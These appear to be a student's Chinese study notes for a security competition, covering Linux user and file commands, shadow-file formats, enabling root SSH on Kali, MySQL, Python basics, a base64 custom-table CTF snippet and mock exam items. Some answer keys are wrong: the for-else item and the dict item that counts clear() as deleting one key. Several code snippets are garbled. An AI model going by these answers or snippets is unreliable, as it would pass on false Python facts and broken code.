内核无法被用户直接使用，需要配合应用程序才能被用户使用。\n  - 在内核之上，封装系统级应用程序，组合在一起就称之为Linux发行版。\n#### kali ssh连接finalshell\n- kali默认是禁用ssh 我们需要修改配置文件设置开机自启动。\n  - 输入：sudo -i （进入root管理员用户）\n  - 输入：vim /etc/ssh/sshd_config 回车 （编辑配置文件）\n  - 输入：：set nu 回车（显示行数）\n  - 输入：按i键进入编辑模式找到第34行，将#去掉 后面变成yes（允许root用户登录）\n  - 找到第57行，将#去掉 后面变成yes（允许密码登录）\n  - 按Esc键退出编辑 输入：wq 保存文件\n  - 输入：systemctl start ssh （开启ssh服务）\n  - 设置开机自启：update-rc.d ssh enable\n  - 输入 systemctl status ssh\n- **注意：正常命令行输入命令是sshd而不是ssh这里是特殊情况！！！**\n#### 命令\n\n\n##### 用户相关\n- 添加：`useradd 选项 用户名`\n\n![alt text](/img/警铮杯准备_image.png)\n- 删除：`userdel 选项 用户名`\n  - `-r`：把用户的主目录一起删除。\n- 修改：`usermod 选项 用户名`\n- 切换root\n  - 可以通过`su - root`，并输入密码\n  - 通过输入exit命令，退回上一个账户，无需密码\n- 查看：`id 用户名`\n- 查看：`getent`\n  - `getent passwd`\n    - 用户名：密码（x）：用户ID：组ID：描述信息（无用）：HOME目录：执行终端（默认bash）\n  - `getent group`\n    - 包含3份信息，组名称：组认证（显示为×）：组ID\n- `sudo`\n  - 为普通用户配置sudo认证\n  - root输入visudo打开/etc/sudoers\n  - 最后添加`iteima ALL=(ALL)    NOPASSD: ALL`\n  - 但是失败了\n- `passwd`\n  - `-l` 锁定口令，即禁用账号。\n  - `-u` 口令解锁。\n  - `-d` 使账号无口令。\n  - `-f` 强迫用户下次登录时修改口令。\n- `groupadd 选项 用户组`\n  - `-g` GID 指定新用户组的组标识号（GID）\n  - `-o` 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同。\n- `groupdel 用户组`\n- `groupmod 选项 用户组`\n  - `-g` GID 为用户组指定新的组标识号。\n  - `-o` 与-g选项同时使用，用户组的新GID可以与系统已有用户组的GID相同。\n  - `-n` 新用户组，将用户组的名字改为新名字\n实例1：\n- 切换用户组`newgrp root`\n##### ls\n  - ls [-a -l -h] [way]\n  - 直接输入ls命令，表示列出当前工作自录下的内容\n  - 当前工作自录是:\n    - Linux系统的命令行终端，在启动的时候，默认会加载当前登录用户的HOME目录作为当前工作目录，所以ls命令列出的是HOME目录的内容\n    - HOME自录：每个Linux操作用户在Linux系统的个人账户自录，路径在：/home/用户名\n  - `-a`选项：all的意思，即列出全部文件（包含隐藏的文件/文件夹）\n    - 以.开头的，表示是Linux系统的隐藏文件/文件夹（只要以.开头，就能自动隐藏）\n  - `-l`选项：竖向排列显示\n  - `-h`选项，需要和`-l`  选项搭配使用，以更加人性化的方式显示文件的大小单位\n  - `-la`,`-al`,`-l -a`都可以 \n##### cd：change directory\n  - cd不带参数回用户根目录\n##### pwd：print working directory\n- `-p` ：显示出确实的路径，而非使用链接 (link) 路径。\n##### 特殊路径符：\n  - `.` 表示当前目录，比如`cd./Desktop`表示切换到当前目录下的Desktop目录内，和`cd Desktop`效果一致\n  - `..`表示上一级目录，比如：`cd..`即可切换到上一级目录，`cd ../..`切换到上二级的目录\n  - `~`表示HOME目录，比如：`cd ~`即可切换到HOME目录或`cd~/Desktop`，切换到HOME内的Desktop目录\n##### mkdir：Make Directory【蓝色深色/d】\n- 通过mkdir命令可以创建新的目录（文件夹）\n- `-m` ：配置文件的权限喔！直接配置，不需要看默认权限 (umask) 的脸色～\n- `-p`可选，表示自动创建不存在的父目录，适用于创建连续多层级的目录\n- 注意：创建文件夹需要修改权限，操作在HOME目录内默认有权限\n##### rmdir (删除空的目录)\n- `rmdir [-p] 目录名称`\n- `-p` ：从该目录起，一次删除多级空目录\n##### touch创建文件【浅色/- 】\n可以通过touch命令创建文件语法：touchLinux路径\n·touch命令无选项，参数必填，表示要创建的文件路径，相对、绝对、特殊路径符均可以使用\n##### 查看文件内容\n###### cat/tac命令\n- 可以通过cat命令查看文件的内容。\n  - -b ：列出行号，仅针对非空白行做行号显示，空白行不标行号！\n  - -n ：列印出行号，连同空白行也会有行号，与 -b 的选项不同；\n  - -v ：列出一些看不出来的特殊字符\n- `tac`从最后一行开始显示，可以看出tac是cat的倒着写！\n###### nl\n-  `nl -bnw 文件`\n- `-b` ：指定行号指定的方式，主要有两种：\n  - `-b a` ：表示不论是否为空行，也同样列出行号(类似 cat -n)；\n  - `-b t` ：如果有空行，空的那一行不要列出行号(**默认值**)；\n###### more命令\n- more支持翻页\n- 在查看的过程中，通过空格翻页，通过q退出查看\n- `/字串`：代表在这个显示的内容当中，向下搜寻『字串』这个关键字；\n- `:f `：立刻显示出档名以及目前显示的行数；\n- b 或 [ctrl]-b ：代表往回翻页，不过这动作只对文件有用，对管线无用。\n###### less\n- /字串     ：向下搜寻『字串』的功能；\n- ?字串     ：向上搜寻『字串』的功能；\n##### cp命令：copy\n- cp命令可以用于复制文件\\文件夹，cp命令来自英文单词：\n- `cp [-r] 参数1 参数2`\n  - `-r`选项，可选，用于复制文件夹使用，表示递归\n  - `-i`：若目标档(destination)已经存在时，在覆盖时会先询问动作的进行\n  - `-p`：连同文件的属性一起复制过去，而非使用默认属性(备份常用)；\n  - 参数1，Linux路径，表示被复制的文件或文件夹\n  - 参数2，Linux路径，表示要复制去的地方\n##### rm：remove\n- rm命令可用于删除文件、文件夹\n- `rm [-r-f] 参数1 参数2 参数N`\n  - `-r`选项用于删除文件夹\n  - `-i` ：互动模式，在删除前会询问使用者是否动作\n  - `-f`表示force，强制删除（不会弹出提示确认信息）\n    - 普通用户副除内容不会弹出提示，只有root管理员用户副除内容会有提示所以一般营通用户用不到-f选项\n  - 参数1、参数2、、参数N表示要除的文件或文件夹路径，按照空格隔开\n##### mv：move\n- mv命令可以用于移动文件\\文件夹\n- mv 参数1 参数2\n  - 参数1，Linux路径，表示被移动的文件或文件夹\n  - 参数2，Linux路径，表示要移动去的地方，如果目标不存在，则进行改名，确保目标存在\n- rm命令支持通配符，用来做模糊匹配\n##### which 命令名\n- 输出命令文件位置\n##### find 起始路径 -name \"文件名\"（可用通配符*）\n- 按文件大小查找文件语法：`find 起始路径 -size +|-n[kMG]`\n  - `+`、`-`表示大于和小于\n  - `n`表示大小数字\n  - kMG表示大小单位，k（小写字母）表示kb，M表示MB，G表示GB\n##### grep\n- 从文件中通过关键字过滤文件\n- grep [-n] 关键字 文件路径\n  - -n，可选，表示在结果中显示匹配的行的行号。\n##### wc命令\n- 统计文件的行数、单词数量等\n- `wc [-c -m -l -w] `文件路径\n  - 直接使用就显示：行数，单词数，字节数，文件名\n  - `-c`，统计bytes数量\n  - `-m`，统计字符数量\n  - `-l`，统计行数\n  - `-w`，统计单词数量\n##### 管道符 `|`\n##### echo\n- 带有空格或\\等特殊符号，建议使用双引号包围\n##### 反引号 ` `` `\n- 包围内容作为命令执行\n##### 重定向符\n- \\>，将左侧命令的结果，**覆盖**写入到符号右侧指定的文件中\n- \\>>，将左侧命令的结果，**追加**写入到符号右侧指定的文件中\n##### head/tail命令\n- `head -n 20 文件路径`\n  - 默认显示前10行\n- `tail [-f-num] Linux路径`\n  - -f，表示持续跟踪，ctrl+C强行终止\n  - -num，表示，查看尾部多少行，不填默认10行【-5，-10的意思不是-num字面意思】\n##### vi vim：更多快捷键未看扔本地www了\n- 命令/输入i/底线命令模式\n- 使用：`vim 文件路径`\n- 底线命令模式：`:wq`\n<!-- 让表格居中显示的风格 -->\n<style>\n.center \n{\n  width: auto;\n  display: table;\n  margin-left: auto;\n  margin-right: auto;\n}\n</style>\n<div class=\"center\">\n<!-- 表格输入位置 -->\n\n|i | 切换到输入模式，在光标当前位置开始输入文本。|\n|:--:|:--:|\n|x | 删除当前光标所在处的字符。|\n|: | 切换到底线命令模式，以在最底一行输入命令。|\n|a | 进入插入模式，在光标下一个位置开始输入文本。|\n|o|在当前行的下方插入一个新行，并进入插入模式。|\n|O | 在当前行的上方插入一个新行，并进入插入模式。|\n|dd | 剪切当前行。|\n|yy | 复制当前行。|\n|p（小写） | 粘贴剪贴板内容到光标下方。|\n|P（大写）| 粘贴剪贴板内容到光标上方。|\n|u | 撤销上一次操作。|\n|Ctrl + r | 重做上一次撤销的操作。|\n|:w | 保存文件。|\n|:q | 退出 Vim 编辑器。|\n|:q! | 强制退出Vim 编辑器，不保存修改。|\n|:set nu|显示行号|\n|:set paste|设置粘贴模式|\n</div>\n\n#### 与用户账号有关的系统文件\n- /etc/passwd文件是用户管理工作涉及的最重要的一个文件。\n一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：\n```\n用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell\n```\n  - 许多Linux 系统（如SVR4）都使用了shadow技术，把真正的加密后的用户口令字存放到/etc/shadow文件中，而在/etc/passwd文件的口令字段中只存放一个特殊的字符，例如“x”或者“*”。\n  - 通常用户标识号的取值范围是0～65 535。0是超级用户root的标识号，1～99由系统保留，作为管理账号，普通用户的标识号从100开始。在Linux系统中，这个界限是500。\n  - “组标识号”字段记录的是用户所属的用户组，它对应着/etc/group文件中的一条记录。\n  - Shell是用户与Linux系统之间的接口。Linux的Shell有许多种，每种都有不同的特点。常用的有sh(Bourne Shell), csh(C Shell), ksh(Korn Shell), tcsh(TENEX/TOPS-20 type C Shell), bash(Bourne Again Shell)等。系统管理员可以根据系统情况和用户习惯为用户指定某个Shell。如果不指定Shell，那么系统使用sh为默认的登录Shell，即这个字段的值为/bin/sh。\n#### finalshell小技巧\n- ctrl+L清屏幕\n\n#### 与比赛关系不大\n##### Linux 磁盘管理\n- 放桌面www文件夹里了\n- 网页地址：<https://www.runoob.com/linux/linux-filesystem.html>\n##### 拥有帐户文件\n1、除了上面列出的伪用户外，还有许多标准的伪用户，例如：audit, cron, mail, usenet等，它们也都各自为相关的进程和文件所需要。\n- 由于/etc/passwd文件是所有用户都可读的，如果用户的密码太简单或规律比较明显的话，一台普通的计算机就能够很容易地将它破解，因此对安全性要求较高的Linux系统都把加密后的口令字分离出来，单独存放在一个文件中，这个文件是/etc/shadow文件。 有超级用户才拥有该文件读权限，这就保证了用户密码的安全性。\n2、/etc/shadow中的记录行与/etc/passwd中的一一对应，它由pwconv命令根据/etc/passwd中的数据自动产生\n- 它的文件格式与/etc/passwd类似，由若干个字段组成，字段之间用\":\"隔开。这些字段是：\n```\n登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志\n```\n- \"登录名\"是与/etc/passwd文件中的登录名相一致的用户账号\n- \"口令\"字段存放的是加密后的用户口令字，长度为13个字符。如果为空，则对应用户没有口令，登录时不需要口令；如果含有不属于集合 { ./0-9A-Za-z }中的字符，则对应的用户不能登录。\n- \"最后一次修改时间\"表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不一样。例如在SCO Linux 中，这个时间起点是1970年1月1日。\n- \"最小时间间隔\"指的是两次修改口令之间所需的最小天数。\n- \"最大时间间隔\"指的是口令保持有效的最大天数。\n- \"警告时间\"字段表示的是从系统开始警告用户到用户密码正式失效之间的天数。\n- \"不活动时间\"表示的是用户没有登录活动但账号仍能保持有效的最大天数。\n- \"失效时间\"字段给出的是一个绝对的天数，如果使用了这个字段，那么就给出相应账号的生存期。期满后，该账号就不再是一个合法的账号，也就不能再用来登录了。\n下面是/etc/shadow的一个例子：\n```\n＃ cat /etc/shadow\n\nroot:Dnakfw28zf38w:8764:0:168:7:::\ndaemon:*::0:0::::\nbin:*::0:0::::\nsys:*::0:0::::\nadm:*::0:0::::\nuucp:*::0:0::::\nnuucp:*::0:0::::\nauth:*::0:0::::\ncron:*::0:0::::\nlisten:*::0:0::::\nlp:*::0:0::::\nsam:EkdiSECLWPdSa:9740:0:0::::\n```\n3、用户组的所有信息都存放在/etc/group文件中。\n- 将用户分组是Linux 系统中对用户进行管理及控制访问权限的一种手段。\n- 每个用户都属于某个用户组；一个组中可以有多个用户，一个用户也可以属于不同的组。\n- 当一个用户同时是多个组中的成员时，在/etc/passwd文件中记录的是用户所属的主组，也就是登录时所属的默认组，而其他组称为附加组。\n- 用户要访问属于附加组的文件时，必须首先使用newgrp命令使自己成为所要访问的组中的成员。\n- 用户组的所有信息都存放在/etc/group文件中。此文件的格式也类似于/etc/passwd文件，由冒号(:)隔开若干个字段，这些字段有：\n```\n组名:口令:组标识号:组内用户列表\n```\n- \"组名\"是用户组的名称，由字母或数字构成。与/etc/passwd中的登录名一样，组名不应重复。\n- \"口令\"字段存放的是用户组加密后的口令字。一般Linux 系统的用户组都没有口令，即这个字段一般为空，或者是*。\n- \"组标识号\"与用户标识号类似，也是一个整数，被系统内部用来标识组。\n- \"组内用户列表\"是属于这个组的所有用户的列表，不同用户之间用逗号(,)分隔。这个用户组可能是用户的主组，也可能是附加组。\n/etc/group文件的一个例子如下：\n```\nroot::0:root\nbin::2:root,bin\nsys::3:root,uucp\nadm::4:root,adm\ndaemon::5:root,daemon\nlp::7:root,lp\nusers::20:root,sam\n```\n四、添加批量用户\n- 添加和删除用户对每位Linux系统管理员都是轻而易举的事，比较棘手的是如果要添加几十个、上百个甚至上千个用户时，我们不太可能还使用useradd一个一个地添加，必然要找一种简便的创建大量用户的方法。Linux系统提供了创建大量用户的工具，可以让您立即创建大量用户，方法如下：\n（1）先编辑一个文本用户文件。\n- 每一列按照/etc/passwd密码文件的格式书写，要注意每个用户的用户名、UID、宿主目录都不可以相同，其中密码栏可以留做空白或输入x号。一个范例文件user.txt内容如下：\n```\nuser001::600:100:user:/home/user001:/bin/bash\nuser002::601:100:user:/home/user002:/bin/bash\nuser003::602:100:user:/home/user003:/bin/bash\nuser004::603:100:user:/home/user004:/bin/bash\nuser005::604:100:user:/home/user005:/bin/bash\nuser006::605:100:user:/home/user006:/bin/bash\n```\n（2）以root身份执行命令 /usr/sbin/newusers，从刚创建的用户文件user.txt中导入数据，创建用户：\n```\n# newusers < user.txt\n```\n- 然后可以执行命令 vipw 或 vi /etc/passwd 检查 /etc/passwd 文件是否已经出现这些用户的数据，并且用户的宿主目录是否已经创建。\n（3）执行命令/usr/sbin/pwunconv。\n- 将 /etc/shadow 产生的 shadow 密码解码，然后回写到 /etc/passwd 中，并将/etc/shadow的shadow密码栏删掉。这是为了方便下一步的密码转换工作，即先取消 shadow password 功能。\n```\n# pwunconv\n```\n（4）编辑每个用户的密码对照文件。\n- 格式为：\n```\n用户名:密码\n```\n- 实例文件 passwd.txt 内容如下：\n```\nuser001:123456\nuser002:123456\nuser003:123456\nuser004:123456\nuser005:123456\nuser006:123456\n```\n（5）以 root 身份执行命令 /usr/sbin/chpasswd。\n创建用户密码，chpasswd 会将经过 /usr/bin/passwd 命令编码过的密码写入 /etc/passwd 的密码栏。\n```\n# chpasswd < passwd.txt\n```\n（6）确定密码经编码写入/etc/passwd的密码栏后。\n执行命令 /usr/sbin/pwconv 将密码编码为 shadow password，并将结果写入 /etc/shadow。\n```\n# pwconv\n```\n- 这样就完成了大量用户的创建了，之后您可以到/home下检查这些用户宿主目录的权限设置是否都正确，并登录验证用户密码是否正确。\n\n### MySQL\n#### 安装——小皮面板\n- `mysql -u root -p`登录，密码默认为root\n#### MySQL视频教程\n- 计算机语言概述\n计算机语言（programminglanguage）可以简单的理解为一种计算机和人都能识别的语言。\n  - 机器语言、汇编语言、高级语言\n- SQL的概述\n  - SQL全称：StructuredQuery,Language，是结构化查询语言，用于访问和处理数据库的标准的计算机语言。 \n  - 非过程化语言，与其他语言可以结合\n  - 对大小写不敏感，以;结尾\n- 注释方式\n  - `-- `\n  - `#`\n  - `/**/`\n- 数据库分类\n  - 关系型数据库（RDBMS）\n    - Oracle数据库（老大，最挣钱的数据库）\n    - MySQL数据库（最流行中型数据库）\n    - SQLserver数据库（Windows上最好的数据库）\n    - PostgreSQL（功能最强大的开源数据库）\n    - SQLite（最流行的嵌入式数据库）\n  - 非关系型数据库(NoSQL)\n    - Redis（最好的缓存数据库）\n    - MongoDB（最好的文档型数据库）\n    - Elasticsearch（最好的搜索服务）\n    - Cassandra（最好的列式数据库）\n    - HBase（优秀的分布式、列式数据库）\n- alpha是测试版本\n- 数据类型\n  - 暂时跳过，本地保存www文件夹：MySQL 数据类型 _ 菜鸟教程.html\n- DDL数据定义语言\n  - 查看show databases;\n  - 创建create [if not exists] database;\n    - CREATE DATABASE [IF NOT EXISTS] database_name\n      [CHARACTER SET charset_name]\n      [COLLATE collation_name];\n  - 切换use database;\n  - 删除drop database [if exists] database;\n  - 修改编码alter database mydb1 character set uft8;\n  - 插入\n    - INSERT INTO users (username, email, birthdate, is_active)\n      VALUES ('test', 'test@runoob.com', '1990-01-01', true);\n  - 创建表\n```SQL\nuse mydb1;\ncreate table [if not exists] mydb1(\n  -- 字段名 类型[(宽度)] [约束条件] [comment '字段说明']，\n  sid int,\n  name varchar(20),\n  gendeer varchar(10),\n  birth date,\n  address varchar(20),\n  score double --注意最后一个这里没有逗号！！！\n)\n```\n\n![alt text](/img/警铮杯准备_image-6.png)\n#### MySQL文字教程\n- 优先级：\n  - 关联条件 > where\n- 指定主机和端口连接（适用于远程连接）: `mysql -h 主机名或IP地址 -P 端口号 -u 用户名 -p`\n- 选择数据库：`USE database_name;`\n- where\n  - AND OR LIKE模糊匹配 IN NOT BETWEEN /IS NULL/IS NOT NULL\n  - LIKE子句中使用百分号%字符来表示任意字符\n  - MySQL 的 WHERE 子句的字符串比较是不区分大小写的。 你可以使用 BINARY 关键字来设定 WHERE 子句的字符串比较是区分大小写的\n```SQL\nSELECT column1, column2, ...\nFROM table_name\nWHERE BINARY condition; \n```\n- UNION\n  - 使用 UNION ALL 不去除重复行\n- ORDER BY(排序) 语句可以按照一个或多个列的值进行升序（ASC默认）或降序（DESC）排序\n  ```SQL\n  ORDER BY department_id ASC, hire_date DESC;\n  ```\n  - 按第三列（salary）降序 DESC 排序，然后按第一列（first_name）升序 ASC 排序。\n  - 从 MySQL 8.0.16 版本开始，可以使用 NULLS FIRST 或 NULLS LAST 处理 NULL 值\n  ```SQL\n  ORDER BY price DESC NULLS LAST;\n  ORDER BY price DESC NULLS FIRST;\n  ```\n- QROUP BY\n```SQL\nSELECT customer_id, SUM(order_amount) AS total_amount\nFROM orders\nGROUP BY customer_id;\n```\n- `select coalesce(a,b,c)`\n参数说明：如果 a==null，则选择 b；如果 b==null,则选择 c；如果 a!=null,则选择 a；如果 a b c 都为 null ，则返回为 null（没意义）。\n```SQL\nSELECT coalesce(name, '总数'), \nSUM(signin) as signin_count \nFROM  employee_tbl \nGROUP BY name \nWITH ROLLUP;\n```\n- 连接\n  - INNER JOIN：返回两个表中满足连接条件的匹配行\n  ```SQL\n  SELECT column1, column2, ...\n  FROM table1\n  INNER JOIN table2 ON table1.column_name = table2.column_name;\n  --使用表别名\n  SELECT o.order_id, c.customer_name\n  FROM orders AS o\n  INNER JOIN customers AS c ON o.customer_id = c.customer_id;\n  --  多表 INNER JOIN\n  SELECT orders.order_id, customers.customer_name, products.product_name\n  FROM orders\n  INNER JOIN customers ON orders.customer_id = customers.customer_id\n  INNER JOIN order_items ON orders.order_id = order_items.order_id\n  INNER JOIN products ON order_items.product_id = products.product_id;\n  -- 使用 WHERE 子句进行过滤\n  SELECT orders.order_id, customers.customer_name\n  FROM orders\n  INNER JOIN customers ON orders.customer_id = customers.customer_id\n  WHERE orders.order_date >= '2023-01-01';\n  ```\n  - LEFT JOIN：**返回左表的所有行**，并包括右表中匹配的行，如果右表中没有匹配的行，将返回NULL值\n  ```SQL\n  SELECT customers.customer_id, customers.customer_name, orders.order_id\n  FROM customers\n  LEFT JOIN orders ON customers.customer_id = orders.customer_id;\n  -- 使用表别名\n  SELECT c.customer_id, c.customer_name, o.order_id\n  FROM customers AS c\n  LEFT JOIN orders AS o ON c.customer_id = o.customer_id;\n  -- 多表 LEFT JOIN：\n  SELECT customers.customer_id, customers.customer_name, orders.order_id, products.product_name\n  FROM customers\n  LEFT JOIN orders ON customers.customer_id = orders.customer_id\n  LEFT JOIN order_items ON orders.order_id = order_items.order_id\n  LEFT JOIN products ON order_items.product_id = products.product_id;\n  -- 使用 WHERE 子句进行过滤：\n  SELECT customers.customer_id, customers.customer_name, orders.order_id\n  FROM customers\n  LEFT JOIN orders ON customers.customer_id = orders.customer_id\n  WHERE orders.order_date >= '2023-01-01' OR orders.order_id IS NULL;\n  ```\n  - RIGHT JOIN\n- 不小心看多了。。。看到连接了\n### python文字教程\n#### 注释\n- 快捷键：ctrl+/\n- 如果需要撤销注释，选择注释行，按 ctrl+/ 将撤销注释。\n#### 数据类型\n##### 列表list[]：可变，有序，可重复\n- .append()/.remove()/[number]\n##### 元组tuple()：不可变，有序，可重复\n##### 集合set：无序，不可重复\n##### 字典{}\n- 键必须为不可变数据类型；即字符串、整数、浮点数等，不能为列表\n- 添加或更新键值对的方法：字典名[\"键\"] = \"值\"\n- 判断键是否存在字典里面：\"键\" in 字典名\n- 删除键与对应的值：del 字典名[\"键\"]，如果键不存在，指令会报错。\n- 返回字典的键、值、键值对的方法：.keys()/.values()/.items()\n#### 格式化字符串\n- format\n  - `\"{0}{1}\".format(one,two)`输出`onetwo`\n  - `\"{one}{two}\".format(one=one1,two=two1)`输出`one1twoo1`\n- f：引用已定义的字符串变量。\n  ```python\n  name=\"老林\" year =\"虎\"\n  message_content = f'''  \n  律回春渐，新元肇启。\n  新岁甫至，福气东来。\n  金{year}贺岁，欢乐祥瑞。\n  金{year}敲门，五福临门。\n  给{name}及家人拜年啦！\n  新春快乐，{year}年大吉！\n  '''\n  ```\n  - 冒号+点+数字+f 来指定浮点数在格式化是保留几位小数\n  - 例子：\n    ```python\n    name = 1\n    gpa = 2\n    print(f\"{0}你好，你的当前绩点为：{1:.2f}\".format(name,gpa))\n    ```\n\n\n- %：'%s,%s' % (name,name1)\n  - %d整数，%f浮点数    \n  - %5d：表示将整数的宽度控制在5位，如数字11，被设置为5d，就会变成：[空格][空格][空格]11，用三个空格补足宽度。\n  - 小数点和小数部分也算入宽度计算\n\n#### 类\n- 定义\n```python\nclass 类名: # 类的构造函数，主要作用是定义实例对象的属性，__init__是固定项\n  def __init__(self, cat_name, cat_age, cat_color): # self为固定项，代表类自己\n    self.name = cat_name self.age = cat_age\n    self.color = cat_color\n```\n- 在子类A名称后的括号中写上父类B的名称，此时父类的方法就会继承到子类中\n```python\nclass A(B):\n  def __init__(self):\n```\n- 如果子类程序中有__init__方法，则创建子类实例时优先调用子类的构造函数，导致实例只有子类的__init__中的属性参数，而父类的__init__属性参数不会被调用。\n#### Python文件操作\n##### open\n```python\nf = open(\"./data.txt\", \"r\", encoding=\"utf-8\") # 默认r还有w模式\n```\n##### read()\n- 运行read()方法会一次性读取文件里面的所有内容，并以字符串的形式返回。一般操作的文件以文本为主。其他类似word文件内有字体颜色、字号区分的文件，很可能读取有误。\n- 运行read()方法后，再次调用时返回的结果为空，因为程序会记录文件读取到哪个位置，第一次运行read()时已经读到结尾，第二次运行时后面已经没有内容。\n- 文件太大时不建议使用read()方法，因为读出来的内容会占用很大的内存。如果不需要一次性读取整个文件，可以在read()传一个数字，表示读多少个字节，下次调用read时会从上次结束位置继续往下读。\n##### readline() \n- 只读取文件一行内容，下次调用时继续读取下一行，根据换行符来判断什么时候结束本行。并且换行符会被当成读到的内容的一部分。读取到结尾后，继续读取将会返回空字符串，表示后面已经无内容。\n```python\nf = open(\"./data.txt\", \"r\", encoding=\"utf-8\")\nline = f.readline() while line !=\nprint(line)\nline = f.readline()\n# 读第一行\n#判断当前行是否为空，不为空则打印当前行\n```\n##### readlines()\n- 读取文件内容，并将每行作为列表元素返回。\n```python\nf = open(\"./data.txt\"，\"r\",encoding=\"utf-8\")\n# readlines会读全部文件内容，并把每行作为列表元素返回 print(f.readlines())\n# 一般和for循环结合使用。先调用readlines方法把每行读取出来，再逐行循环列表所有内容\n```\n##### close()关闭文件\n- 调用close方法后将会释放系统资源，每次调用文件完成后都应该关闭文件。\n```python\nf = open(\"./data.txt\")\nprint(f.read())\nf.close()\n```\n```python\nwith open(\"./data.txt\") as f:\n  print(f.read())  #对文件的操作\n```\n- 如上方式可以不用调用close方法关闭文件，文件操作完成后会自动关闭文件。注意对文件操作的代码需要缩进，**缩进的代码块执行完毕后会自动关闭文件**\n##### open\n```python\nwith open(\"./data.txt\",\"w\", encoding=\"utf-8\") as f:\n```\n- open的第二个参数传入w，即为写文件模式，写文件模式找不到文件，不会像读文件模式那样报错，而是自动创建传入文件名的那个文件。第三个参数为encoding编码格式。\n- 注：使用w模式打开文件进行写入时，如果文件已存在，将会把原有文件内容**全部清空**。\n- 增加文件内容，则open()的第二个参数需要传入附加模式“a”参数\n-  无论是\"w\"模式，还是\"a\"模式，都不能读取文件原本的内容，如果在这两个模式下调用read()方法，程序会报错不支持读操作(UnsupporttedOperation)。\n-  r+，同时支持读写文件\n   - open()方法的第二个参数传入”r+”参数，就可以**同时支持读写文件**\n#### Python异常处理\n- 需要注意的是，try/except语句在捕捉错误时，依次从上往下运行，如果第一个except已经捕捉到错误，之后的except将不会执行，与if/elif语句类似，只有第一个符合条件的分支会运行。\n```python\ntry:\nexcept ValueError:\nexcept ZeroDivisionError:\nexcept:\nelse:\nfinally:\n```\n- else:  表示没有出现任何错误时执行的语句。\n- finally:     无论是否发生错误，都会执行的语句。\n#### Python测试\n- assert 断言\n  - assert后面可以跟上任何布尔表达式，在assert后面跟上我们认为为True的表达式，如果assert后面的表达式最终求出来为True，则正常结束，继续运行后面的代码。如果求出来的结果为False，则会产生“AssertionError”断言错误。\n#### unittest\n- 自带库，需要import导入\n- 测试方法命名必须以 test_ 开头。因为 unittest 库只把 test_ 开头的方法当作测试用例\n- 没看懂测试这一块，后面再看\n#### 高阶函数（函数名作为变量）/匿名函数lambda变量：输出内容\n\n### python视频教程\n- 太慢了，不看了\n\n#### 零碎\n- pass 在Python中是一个空语句，什么都不做，占位语句\n- range的第三个参数为步长，不指明的时候默认为1\n- 函数运行完成后，没有写返回值，默认返回值为 None。\n- from后面添加模块名，import后面添加函数名或变量名，需要引入多个的时候用逗号进行分隔，此方法在使用时不需要再带上模块名。\n\n### excel\n- 分列\n\n![alt text](/img/警铮杯准备_image-7.png)\n#### 函数\n- SUM(A1:A3)\n  - SUM(A1,A2,A3)\n- 单条件求和sumif\n  - =SUMilF(range，criteria，sum_range) \n  - Range为条件区域，用于条件判断的单元格区域。\n  - Criteria是求和条件，由数字、逻辑表达式等组成的判定条件。\n  - Sum_range为实际求和区域，需要求和的单元格、区域或引用。\n  - eg：=SUMIF（A15:A25,“橡皮擦'，B15:B25）\n- 多条件求和sumifs\n\n## 题目\n#### misc-base换表\n```python\nimport base64\nimport string\n# 待解密字符串\ndata = \"x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q\"\n# 换表字符集（示例）\ncustom_table = \"ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/\"\nstandard_table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n# 替换回标准Base64并解码\ntranslated = data.translate(str.maketrans(custom_table, standard_table))\ndecoded = base64.b64decode(translated)\nprint(decoded.decode(errors=\"ignore\"))\n```\n\n## 模拟赛\n### 1.1\n#### 1.1.2 多选题\n1.  **以下哪个语句可以删除字典中的一个键值对？**\n    A. `del dict['key']`\n    B. `dict.remove('key')`\n    C. `dict.pop('key')`\n    D. `dict.clear()`\n\n    **答案：ACD**\n    **解析：**python的字典没有remove方法\n\n\n2.  **以下关于 Python 异常处理的说法，正确的是？（ ）**\n    A. 可以使用`try - except`块来捕获和处理异常\n    B. 可以有多个`except`块来捕获不同类型的异常\n    C. 还可以使用`finally`块，无论是否发生异常，`finally`块中的代码都会执行\n    D. 异常处理可以提高程序的健壮性，避免程序因为异常而崩溃\n\n    **答案：ABCD**\n    **解析：**在 Python 中，`try - except`是基本的异常处理结构，`try`块中放置可能会出现异常的代码，`except`块用于捕获和处理异常。可以有多个`except`块，每个`except`块针对不同类型的异常进行处理。`finally`块是可选的，不管`try`块中是否发生异常，`finally`块中的代码都会执行，通常用于清理资源等操作。通过合理的异常处理，可以让程序在遇到异常情况时能够进行适当的处理，而不是直接崩溃，从而提高程序的健壮性。\n\n#### 1.1.3 判断题\n\n\n\n1.  **`for`循环中的`else`子句，当`for`循环正常执行完（没有被`break`中断）后会执行，若`for`循环因为`break`跳出则`else`子句不会执行。**\n    **答案：错误**\n    **解析：**建议写个代码运行试试。\n\n\n\n\n#### 1.1.4 实操题\n\n\n\n##### 1.1.4.2 文件操作与数据分析\n\n**题目描述**：\n假设你有一个名为`data.txt`的文本文件，其中包含了多行数据，每行数据都是一个由逗号分隔的数值列表。例如：\n\n```\n1,2,3,4,5\n6,7,8,9,10\n11,12,13,14,15\n```\n\n编写一个Python程序，完成以下任务：\n\n1. 读取文件`data.txt`中的所有数据。\n2. 将每行数据转换为一个整数列表。\n3. 计算所有数值的总和和平均值。\n4. 找出最大值和最小值。\n5. 将结果输出到控制台。\n\n**实现过程**：\n\n1. 使用文件操作函数来读取文件内容。\n2. 使用字符串的`split`方法来分割每行数据。\n3. 使用列表和循环来处理数据。\n4. 使用内置的数学函数来计算总和、平均值、最大值和最小值。\n\n**代码框架**：\n\n```py\nfilename = 'data.txt'\ntotal = 0\ncount = 0\nmax_value = float('-inf')\nmin_value = float('inf')\n \nwith open(filename, 'r') as file:\n    for line in file:\n        numbers = list(map(int, line.???))\n        total += sum(numbers)\n        count += ???(numbers)\n        for number in numbers:\n            if ???:\n                max_value = number\n            if ???:\n                min_value = number\n 